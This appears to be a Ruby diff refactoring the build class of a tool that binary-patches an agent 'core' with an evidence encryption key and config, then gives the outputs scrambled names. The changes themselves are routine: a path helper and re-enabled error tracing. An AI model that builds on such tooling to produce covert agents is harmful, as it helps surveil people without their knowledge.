@@ -36,6 +36,7 @@ class Build
 
   def initialize
     @outputs = []
+    @scrambled = {}
   end
 
   def self.factory(platform)
@@ -68,7 +69,7 @@ class Build
 
     Zip::ZipFile.open(@core.path) do |z|
       z.each do |f|
-        f_path = File.join(@tmpdir, f.name)
+        f_path = path(f.name)
         FileUtils.mkdir_p(File.dirname(f_path))
         z.extract(f, f_path) unless File.exist?(f_path)
         @outputs << f.name
@@ -83,8 +84,7 @@ class Build
     trace :debug, "Build: patching [#{params[:core]}] file"
 
     # open the core and binary patch the parameters
-    core_file = File.join @tmpdir, params[:core]
-    file = File.open(core_file, 'rb+')
+    file = File.open(path(params[:core]), 'rb+')
     content = file.read
 
     # evidence encryption key
@@ -140,8 +140,7 @@ class Build
 
       # retrieve the config and save it to a file
       config = @factory.configs.first.encrypted_config(@factory.confkey)
-      conf_file = File.join @tmpdir, params[:config]
-      File.open(conf_file, 'wb') {|f| f.write config}
+      File.open(path(params[:config]), 'wb') {|f| f.write config}
 
       @outputs << params[:config]
     end
@@ -164,12 +163,11 @@ class Build
   end
 
   def scramble
+    return if @scrambled.empty?
     # rename the outputs with the scrambled names
     @outputs.each do |file|
       if @scrambled[file.to_sym]
-        old_name = File.join @tmpdir, file
-        new_name = File.join @tmpdir, @scrambled[file.to_sym]
-        File.rename(old_name, new_name)
+        File.rename(path(file), path(@scrambled[file.to_sym]))
         @outputs[@outputs.index(file)] = @scrambled[file.to_sym]
       end
     end
@@ -186,6 +184,10 @@ class Build
 
   def pack
     trace :debug, "super #{__method__}"
+  end
+
+  def path(name)
+    File.join @tmpdir, name
   end
 
   def clean
@@ -208,7 +210,7 @@ class Build
       pack
     rescue Exception => e
       trace :error, "Cannot build: #{e.message}"
-      #trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
+      trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
       clean
       raise 
     end
